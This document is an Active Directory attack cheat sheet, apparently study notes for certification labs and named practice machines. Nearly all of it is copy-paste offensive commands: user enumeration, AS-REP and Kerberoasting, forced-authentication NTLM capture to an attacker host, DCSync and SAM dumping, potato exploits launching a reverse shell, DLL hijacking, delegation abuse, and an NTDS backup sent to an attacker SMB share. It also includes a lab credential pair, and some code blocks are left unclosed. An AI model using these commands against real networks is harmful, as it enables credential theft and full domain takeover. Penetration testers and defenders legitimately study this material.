# Active Directory Master Methodology (The Ultimate Playbook)
Consolidated AD exploitation paths, pivoting techniques, and essential commands based on verified attack chains. Reference tags (e.g., [OSCPA]) link to specific machine notes.

---

## 🚀 FAST PWN 101 (Copy-Paste Cheat Sheet)
*The "Tak Tak Tak" flow for initial compromise.*

```bash
# 1. User Enumeration (Kerbrute)
kerbrute userenum -d domain.local --dc [DC_IP] /usr/share/wordlists/xato-net-10-million.txt

# 2. AS-REP Roasting (No Pre-Auth)
impacket-GetNPUsers domain.local/ -usersfile users.txt -format hashcat -dc-ip [DC_IP]

# 3. SMB Share Enumeration (NetExec)
nxc smb [DC_IP] -u 'user' -p 'pass' --shares
# Note: Use --local-auth for local users, omit for domain users.
# Note: Eric.Wallows case -> nxc smb 192.168.182.153 -u Eric.Wallows -p EricLikesRunning800 --shares

# 4. Kerberoasting (User has valid creds)
impacket-GetUserSPNs domain.local/user:password -dc-ip [DC_IP] -request

# 5. Domain Dominance (Already have Admin/DCSync)
impacket-secretsdump domain.local/admin:password@[DC_IP]
```

---

## 🏗️ Method 1: Initial AD Enumeration & Discovery
Focus on discovering users, groups, and entry points.

### 1.1. LDAP Discovery `[OSCPB]` `[Forest]` `[Hutch]`
```bash
# Null Session Search
ldapsearch -H ldap://[DC_IP] -x -b "dc=domain,dc=local"

# Authenticated Search (Required for most AD environments)
ldapsearch -H ldap://[DC_IP] -x -D "user@domain.local" -w "password" -b "dc=domain,dc=local"

# HUNT: Search for passwords in LDAP Descriptions [Cicada] [Hutch] [Resourced]
# Pattern: cleartext passwords or default creds often left in 'description' field.
netexec ldap [DC_IP] -u user -p password -M get-desc-users
```

### 1.2. Kerberos User Enumeration & Pre-Auth `[Blackfield]` `[Forest]` `[Sauna]`
```bash
# Kerbrute (User Enum via TGT requests) [Blackfield]
kerbrute userenum -d domain.local --dc [DC_IP] users.txt

# AS-REP Roasting (Find users with "Pre-auth Not Required") [Forest] [Blackfield] [Sauna]
impacket-GetNPUsers domain.local/ -usersfile users.txt -format hashcat -outputfile asrep.txt
```

### 1.3. SMB Share Hunting `[Cicada]` `[Active]` `[Blackfield]` `[Resourced]`
Look for shares like `HR`, `Forensic`, `Profiles$`, `Web`, `Dev`, `Password Audit`.
```bash
smbclient -L //[IP] -N
nxc smb [IP] -u user -p password --shares
# Advanced Fuzzing via Proxychains (Targeting isolated segments)
proxychains nxc smb 10.10.142.154 -u users -p 'password' --local-auth

# Check for sensitive files (e.g., Backup_script.ps1 [Cicada], ntds.dit backup [Resourced])
# Pattern: Manual search for .xml, .ps1, or backup files in non-standard shares.
```

### 1.4. LAPS Password Exposure `[Hutch]`
If a user has rights to read LAPS passwords (often IT support users).
```bash
# Read LAPS password using Netexec
netexec smb [DC_IP] -u user -p password --laps
# Read via pyLAPS (LDAP)
python3 pyLAPS.py --action get -d "domain.local" -u "user" -p "password"
```

### 1.5. Automated Path Analysis (BloodHound) `[OSCPB]` `[Forest]` `[Administrator]`
```bash
# Remote Collection
bloodhound-python -u 'user' -p 'password' -ns [DC_IP] -d domain.local -c All
```

---

## 🏹 Method 2: Movement & Lateral Escalation
Techniques to pivot and gain higher-tier user access.

### 2.1. NTLM Capture & Theft `[Flight]`
Use when you have LFI or a writable SMB share.
```bash
# LFI to NTLM Capture [Flight]
# Trigger: index.php?view=//[KALI_IP]/share
sudo responder -I tun0 -v

# NTLM Theft via desktop.ini (Triggering forced auth) [Flight]
python3 ntlm_theft.py --generate all --server [KALI_IP] --filename htb
```

### 2.2. Password Abuse (ForceChangePassword / GenericAll) `[Blackfield]` `[Administrator]`
If you have `GenericAll` or `ForceChangePassword` rights on a user:
```bash
# Reset password via rpcclient
rpcclient -U 'user%password' [DC_IP]
setuserinfo2 target_user 23 'NewPassword123!'
```

### 2.3. Targeted Kerberoasting `[Administrator]`
If you have `GenericWrite` or `GenericAll` over a computer/user account, add a fake SPN to make it Kerberoastable.
```powershell
# Add SPN to target user account
Set-ADUser target_user -ServicePrincipalNames @{Add='MSSQLSvc/fake.domain.local'}
# Request TGS
impacket-GetUserSPNs domain.local/user:password -request-user target_user
```

### 2.4. Service Account Harvesting (Kerberoasting) `[OSCPB]` `[Active]` `[Access]`
```bash
# Remote [Active] [Access]
impacket-GetUserSPNs [DOMAIN]/[USER]:[PASS] -dc-ip [DC_IP] -request
# Local (Rubeus) [OSCPB]
.\rubeus.exe kerberoast /outfile:hashes.txt
```

### 2.5. Group Policy Preferences (GPP) `[Active]`
If you find `Groups.xml` in `SYSVOL` or `NETLOGON`:
```bash
# Decrypt cpassword found in XML
gpp-decrypt [ENCRYPTED_HASH]
```

### 2.6. MSSQL Pivoting `[OSCPB]` `[OSCPA]`
If an MSSQL server is accessible via domain credentials:
```sql
-- Connect and enable xp_cmdshell
impacket-mssqlclient DOMAIN/user:'password'@10.10.x.x -windows-auth
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

### 2.7. Internal File Relay (IIS Web Root Trick) `[OSCPB]`
Used when the target machine cannot reach Kali, but a compromised intermediate box has IIS:
1. **Source**: `copy tool.exe C:\inetpub\wwwroot\t.exe`
2. **Target**: `powershell -c "iwr http://[COMPROMISED_IP]:8000/t.exe -OutFile C:\Temp\t.exe"`

### 2.8. DPAPI & Credential Vaults `[OSCPA]` `[Heist]`
```powershell
# Extract MasterKeys [OSCPA]
mimikatz # dpapi::masterkeys /in:"C:\Users\[USER]\AppData\Roaming\Microsoft\Protect\[SID]\[GUID]"
# Decrypt Chrome Passwords
mimikatz # dpapi::chrome /in:"C:\Users\[USER]\AppData\Local\Google\Chrome\User Data\Default\Login Data"

### 2.9. IIS AppPool Credential Harvesting `[OSCPC]` `[MS02]`
If you have access to a machine running IIS, check for credentials in Application Pools.
```powershell
C:\Windows\system32\inetsrv\appcmd.exe list apppool /config
# HUNT: Search for 'userName' and 'password' in the output.
```

### 2.10. Searching History for Binary Arguments `[OSCPC]` `[MS02]`
High-value credentials often leak when administrators run tools (backup scripts, admin tools, net use) with credentials as arguments.
```powershell
# Check PowerShell History
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
# Check for common patterns:
# - admintool.exe [PASSWORD] [CMD]
# - net use \\share /user:admin [PASSWORD]
# - backup.ps1 -creds [PASSWORD]
```
```

---

## ⚡ Method 3: Windows Privilege Escalation
Common escalation paths on member servers/workstations.

### 3.1. SeImpersonatePrivilege (The Potato Path) `[OSCPB]` `[Gust]` `[Hutch]`
```powershell
# Modern Systems (GodPotato) [Gust] [OSCPB] [Hutch]
.\GodPotato-NET4.exe -cmd "powershell -c [REVERSE_SHELL]"
# Older Systems (PrintSpoofer) [OSCPA] [OSCPB]
.\PrintSpoofer.exe -i -c cmd
```

### 3.2. SeManageVolumePrivilege (DLL Hijacking) `[Access]`
Allows making System32 writable.
1. Run `SeManageVolumeExploit.exe`.
2. Replace `C:\Windows\System32\wbem\tzres.dll` with a malicious DLL.
3. Trigger: `systeminfo`.

### 3.3. HiveNightmare (SeriousSAM) `[Cicada]`
If Windows Build 1809-19043 is present:
```powershell
.\HiveNightmare.exe
# Dump locally on Kali:
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL

### 3.4. C:\windows.old Recovery `[OSCPC]` `[MS02]`
If the system was upgraded, old SAM/SYSTEM hashes exist in the backup directory.
```powershell
dir C:\windows.old\Windows\System32\config\
# Exfiltrate and dump:
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
```
```

### 3.4. SeBackupPrivilege Exploitation `[Cicada]` `[Blackfield]`
```powershell
# Method A: reg save [Cicada]
reg save hklm\sam SAM
reg save hklm\system SYSTEM
# Method B: wbadmin (NTDS Backup) [Blackfield]
echo "Y" | wbadmin start backup -backuptarget:\\[KALI_IP]\share -include:c:\windows\ntds
```

### 3.5. Web Shell Persistence & Session Poisoning `[Sniper]` `[Access]`
- **.htaccess bypass**: `.htaccess` -> `AddType application/x-httpd-php .php16` [Access]
- **Session Poisoning**: Injecting PHP into `\windows\temp\sess_[ID]` via malicious login [Sniper].

---

## 👑 Method 4: Domain Dominance & Advanced Delegation
Steps to achieve complete control over the entire domain.

### 4.1. RBCD (Resource-Based Constrained Delegation) `[Resourced]`
Step 1: Compromise a user with `GenericAll` over a Computer object.
Step 2: Add a machine account: `impacket-addcomputer`.
Step 3: Set delegation: `impacket-rbcd -delegate-from 'ATTACK$' -delegate-to 'RESOURCEDC$'`.
Step 4: Get ST: `impacket-getST -spn 'cifs/dc.domain.local' -impersonate Administrator`.

### 4.2. DCSync (Secretsdump) `[OSCPB]` `[Forest]` `[Flight]` `[Sauna]` `[Administrator]`
Requires `DCSync` rights or Domain Admin.
```bash
# Remote DCSync [OSCPB] [Sauna] [Administrator]
impacket-secretsdump domain.local/[ADMIN]:[PASS]@[DC_IP]
# Remote DCSync (Kerberos Ticket) [Flight]
impacket-getST -spn 'cifs/dc.domain.local' -impersonate Administrator
impacket-secretsdump -k -no-pass [DC_HOSTNAME]
```

### 4.3. Exchange Registry Abuse `[Forest]`
Grant yourself DCSync: `Add-ObjectAcl -PrincipalIdentity "YourUser" -Rights DCSync`.

---

## 🧪 Quick Win Matrix
| Pattern | Machine | Technique |
| :--- | :--- | :--- |
| **LAPS Password** | `Hutch` | `netexec --laps` |
| **Targeted Kerberoast**| `Administrator` | `Set-ADUser` fake SPN |
| **DLL Hijack (Volume)** | `Access` | `tzres.dll` in `System32\wbem` |
| **Autologon Creds** | `Sauna`, `OSCPA` | Registry: `DefaultPassword` |
| **RBCD Pwn** | `Resourced` | Delegation to DC Computer Object |
| **Session Poisoning** | `Sniper` | RCE via PHP Session file |
| **wbadmin NTDS** | `Blackfield` | `wbadmin start backup` to SMB |
